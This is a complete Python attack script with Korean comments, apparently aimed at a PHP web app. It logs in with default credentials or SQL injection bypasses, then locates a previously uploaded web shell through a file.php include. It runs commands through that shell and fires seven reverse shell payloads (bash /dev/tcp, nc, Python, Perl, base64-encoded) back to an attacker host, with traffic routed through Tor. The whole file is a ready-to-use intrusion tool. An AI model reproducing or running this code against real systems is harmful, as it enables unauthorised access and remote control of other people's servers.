#!/usr/bin/env python3
"""
최종 익스플로잇 스크립트
post_exploit.py 알고리즘 + 고급 우회 기법 통합

사용법: python3 00_final_exploit.py <TARGET_IP> <ATTACKER_IP> <ATTACKER_PORT>
"""

import requests
import sys
import time
import random
import base64
from urllib.parse import quote

class FinalExploiter:
    def __init__(self, target_ip, attacker_ip, attacker_port):
        self.target_ip = target_ip
        self.attacker_ip = attacker_ip
        self.attacker_port = attacker_port

        self.session = requests.Session()
        self.session.proxies = {
            'http': 'socks5h://127.0.0.1:9050',
            'https': 'socks5h://127.0.0.1:9050'
        }

        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })

        self.webshell_url = None
        self.webshell_name = None
        self.webshell_param = "x"

    def login(self):
        """로그인 (기본 계정 + SQL Injection)"""
        print("[*] 로그인 시도 중...")

        login_url = f"http://{self.target_ip}/login.php"

        # 기본 계정
        default_creds = [
            ("alice", "alice2024"),
            ("admin", "admin123"),
            ("bob", "bobby123"),
        ]

        for username, password in default_creds:
            try:
                print(f"[*] 시도: {username} / {password}")
                data = {'username': username, 'password': password}
                resp = self.session.post(login_url, data=data, timeout=15, allow_redirects=True)

                if 'login.php' not in resp.url and resp.status_code == 200:
                    print(f"[+] 로그인 성공: {username}")
                    return True

                time.sleep(0.5)
            except:
                continue

        # SQL Injection
        print("[*] SQL Injection 시도...")
        sql_payloads = [
            ("admin", "' or '1'='1' --"),
            ("admin", "' or '1'='1"),
            ("admin' --", 'anything'),
        ]

        for username, password in sql_payloads:
            try:
                data = {'username': username, 'password': password}
                resp = self.session.post(login_url, data=data, timeout=15, allow_redirects=True)

                if 'login.php' not in resp.url and resp.status_code == 200:
                    print(f"[+] SQL Injection 성공")
                    return True
            except:
                continue

        print("[-] 로그인 실패")
        return False

    def find_webshell(self):
        """업로드된 웹쉘 찾기 (post_exploit 알고리즘)"""
        print("\n[*] 웹쉘 검색 중...")

        # 웹쉘 파일명 리스트 (이전에 업로드된 것들)
        shell_names = [
            # 최근 업로드된 파일들
            "shell_4727.php",
            "avatar_4727.jpg",
            "capture_4133.png",
            "banner.png",
            "photo.php.jpg",
            "image_1253.jpg",
            "avatar_1763103728.jpg",

            # 일반적인 이름들
            "shell.jpg",
            "shell.php",
            "shell.png",
            "shell.gif",
            "webshell.jpg",
        ]

        file_php = f"http://{self.target_ip}/file.php"

        # 다양한 파라미터명 시도
        param_names = ['x', 'cmd', 'command', 'c', 'exec', 'e']

        for shell_name in shell_names:
            for param in param_names:
                try:
                    # file.php?name=uploads/shell.jpg&x=pwd 형식
                    test_url = f"{file_php}?name=uploads/{shell_name}&{param}=pwd"
                    resp = self.session.get(test_url, timeout=5)

                    if resp.status_code == 200 and len(resp.text.strip()) > 0:
                        # /var/www 같은 경로가 나오면 성공
                        if '/var' in resp.text or '/home' in resp.text or '/tmp' in resp.text:
                            self.webshell_url = file_php
                            self.webshell_name = f"uploads/{shell_name}"
                            self.webshell_param = param
                            print(f"[+] 웹쉘 발견: {shell_name} (파라미터: {param})")
                            print(f"[+] 테스트: {resp.text.strip()[:50]}")
                            return True
                except:
                    pass

        print("[-] 웹쉘을 찾을 수 없습니다")
        return False

    def execute_command(self, cmd):
        """웹쉘로 명령 실행"""
        if not self.webshell_url:
            return None

        try:
            params = {
                'name': self.webshell_name,
                self.webshell_param: cmd
            }
            resp = self.session.get(self.webshell_url, params=params, timeout=10)
            return resp.text
        except Exception as e:
            return None

    def setup_reverse_shell(self):
        """Reverse Shell 설정 (post_exploit 알고리즘 + 난독화)"""
        print("\n[*] Reverse Shell 설정")
        print(f"[*] C2: {self.attacker_ip}:{self.attacker_port}")
        print(f"\n[!] C2 서버에서 리스너 시작:")
        print(f"    nc -lvnp {self.attacker_port}")

        input("\n[?] 준비되면 Enter...")

        # 다양한 리버스 쉘 페이로드 (post_exploit 방식 + 난독화)
        payloads = [
            # 1. Python (post_exploit 방식)
            f"python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{self.attacker_ip}\",{self.attacker_port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/bash\",\"-i\"])'",

            # 2. Bash 단순
            f"bash -c 'bash -i >& /dev/tcp/{self.attacker_ip}/{self.attacker_port} 0>&1'",

            # 3. Base64 인코딩
            None,  # 아래에서 생성

            # 4. nc
            f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {self.attacker_ip} {self.attacker_port} >/tmp/f",

            # 5. Perl
            f"perl -e 'use Socket;$i=\"{self.attacker_ip}\";$p={self.attacker_port};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");}};'",

            # 6. 변수 우회
            f"H={self.attacker_ip};P={self.attacker_port};bash -c \"bash -i >& /dev/tcp/$H/$P 0>&1\"",

            # 7. 파일 기반
            f"echo 'bash -i >& /dev/tcp/{self.attacker_ip}/{self.attacker_port} 0>&1' > /tmp/.s;bash /tmp/.s",
        ]

        # Base64 페이로드 생성
        reverse_shell_cmd = f"bash -i >& /dev/tcp/{self.attacker_ip}/{self.attacker_port} 0>&1"
        b64_payload = base64.b64encode(reverse_shell_cmd.encode()).decode()
        payloads[2] = f"echo {b64_payload}|base64 -d|bash"

        for i, payload in enumerate(payloads, 1):
            print(f"\n[{i}/{len(payloads)}] 페이로드 #{i}")

            if 'python' in payload:
                print("    타입: Python")
            elif 'base64' in payload:
                print("    타입: Base64")
            elif 'perl' in payload:
                print("    타입: Perl")
            elif 'nc' in payload:
                print("    타입: Netcat")
            else:
                print("    타입: Bash")

            try:
                # 백그라운드로 실행 (post_exploit 방식)
                result = self.execute_command(f"{payload} &")
                print(f"    [+] 전송 완료")
            except Exception as e:
                print(f"    [-] 오류: {str(e)[:50]}")

            time.sleep(2)

            # 중간 확인
            if i % 3 == 0:
                check = input("\n[?] C2 연결됐나요? (y=중단, Enter=계속): ").strip().lower()
                if check == 'y':
                    print("[+] 리버스 쉘 연결 확인!")
                    return True

        print("\n[+] 모든 페이로드 전송 완료")
        print("[!] C2 리스너를 확인하세요")
        print("\n[*] 연결 후 다음 명령 실행:")
        print("    python3 -c 'import pty; pty.spawn(\"/bin/bash\")'")
        print("    export TERM=xterm")

        return False

    def gather_info(self):
        """시스템 정보 수집 (post_exploit 방식)"""
        print("\n[*] 시스템 정보 수집")

        commands = {
            "사용자": "whoami",
            "호스트명": "hostname",
            "현재 디렉토리": "pwd",
            "OS": "cat /etc/os-release | head -3",
        }

        for desc, cmd in commands.items():
            print(f"\n[*] {desc}:")
            result = self.execute_command(cmd)
            if result:
                print(f"    {result.strip()}")

    def run(self):
        """전체 실행"""
        print("="*60)
        print("최종 익스플로잇 스크립트")
        print("post_exploit.py 알고리즘 + 고급 우회 기법")
        print("="*60)

        # 1. 로그인
        if not self.login():
            print("\n[-] 로그인 실패로 종료")
            return

        time.sleep(1)

        # 2. 웹쉘 찾기
        if not self.find_webshell():
            print("\n[-] 웹쉘을 찾을 수 없습니다")
            print("[!] 먼저 파일을 업로드하세요:")
            print("    python3 97_ultimate_upload_bypass.py")
            return

        time.sleep(1)

        # 3. 정보 수집 (선택사항)
        collect = input("\n[?] 시스템 정보 수집? (y/N): ").strip().lower()
        if collect == 'y':
            self.gather_info()

        # 4. 리버스 쉘
        self.setup_reverse_shell()

        print("\n" + "="*60)
        print("[+] 익스플로잇 완료")
        print("="*60)

def main():
    if len(sys.argv) != 4:
        print("사용법: python3 00_final_exploit.py <TARGET_IP> <ATTACKER_IP> <ATTACKER_PORT>")
        print("예시: python3 00_final_exploit.py 43.201.154.142 57.181.28.7 4444")
        sys.exit(1)

    target_ip = sys.argv[1]
    attacker_ip = sys.argv[2]
    attacker_port = int(sys.argv[3])

    exploiter = FinalExploiter(target_ip, attacker_ip, attacker_port)
    exploiter.run()

if __name__ == "__main__":
    main()
